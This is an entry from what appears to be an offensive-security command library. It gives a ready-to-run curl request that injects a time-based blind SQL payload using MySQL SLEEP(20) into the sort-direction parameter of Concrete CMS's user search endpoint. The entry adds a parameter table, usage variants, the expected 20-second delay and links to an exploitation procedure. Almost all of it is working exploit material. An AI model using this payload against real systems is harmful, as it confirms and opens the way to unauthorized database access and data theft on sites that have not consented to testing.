---
id: cmd-uuid-001
data: >-
  curl -X POST
  "http://target/concrete5/index.php/ccm/system/dialogs/user/advanced_search/submit?ccm_token=1589765824:07f645727d279188e2ce2c91835ab0dd"
  -H "Content-Type: application/x-www-form-urlencoded" -d
  "field%5B%5D=keywords&keywords=admin&field%5B%5D=is_active&active=0&u.uName=1&u.uEmail=1&u.uDateAdded=1&u.uStatus=1&u.uNumLogins=1&column%5B%5D=u.uName&column%5B%5D=u.uEmail&column%5B%5D=u.uDateAdded&column%5B%5D=uStatus&column%5B%5D=u.uNumLogins&fSearchDefaultSort=u.uDateAdded&fSearchDefaultSortDirection=desc%2c(select*from(select(sleep(20)))a)&fSearchItemsPerPage=10&__ccm_consider_request_as_xhr=1"
tags:
  - sql-injection
  - time-based
type: command
output: null
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.447Z'
verified: false
validated: true
submitted: true
---
# inject-sleep-20-sql-payload-in-concrete-cms

## Command

```bash
curl -X POST "http://target/concrete5/index.php/ccm/system/dialogs/user/advanced_search/submit?ccm_token=1589765824:07f645727d279188e2ce2c91835ab0dd" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "field%5B%5D=keywords&keywords=admin&field%5B%5D=is_active&active=0&u.uName=1&u.uEmail=1&u.uDateAdded=1&u.uStatus=1&u.uNumLogins=1&column%5B%5D=u.uName&column%5B%5D=u.uEmail&column%5B%5D=u.uDateAdded&column%5B%5D=uStatus&column%5B%5D=u.uNumLogins&fSearchDefaultSort=u.uDateAdded&fSearchDefaultSortDirection=desc%2c(select*from(select(sleep(20)))a)&fSearchItemsPerPage=10&__ccm_consider_request_as_xhr=1"
```

## Description

This curl command sends a POST request to the Concrete CMS advanced user search endpoint, injecting a time-based SQL payload using MySQL SLEEP(20) in the fSearchDefaultSortDirection parameter to cause a 20-second server delay, confirming blind SQL injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `ccm_token` | CSRF token query parameter | Yes |
| `-d` body | URL-encoded form data with injected payload | Yes |
| `fSearchDefaultSortDirection` | Vulnerable parameter with payload: desc,(select*from(select(sleep(20)))a) | Yes |
| `keywords=admin` | Example search keyword | No |

## Examples

### Basic Usage

```bash
curl -X POST "http://target/concrete5/index.php/ccm/system/dialogs/user/advanced_search/submit?ccm_token=YOUR_TOKEN" -H "Content-Type: application/x-www-form-urlencoded" -d "...&fSearchDefaultSortDirection=desc%2c(select*from(select(sleep(20)))a)&..."
```

### Advanced Usage

Add verbose output with `-v` flag to monitor timing:

```bash
curl -v -X POST "http://target/..." -d "..."
```

## Expected Output

HTTP response with JSON search results (e.g., user list) after approximately 20 seconds delay. No SQL errors; delay indicates successful payload execution.

## Related

- [[commands/inject-sleep-30-sql-payload-in-concrete-cms]]
- [[procedures/Exploit-Time-based-SQL-Injection-in-Concrete-CMS-User-Search]]
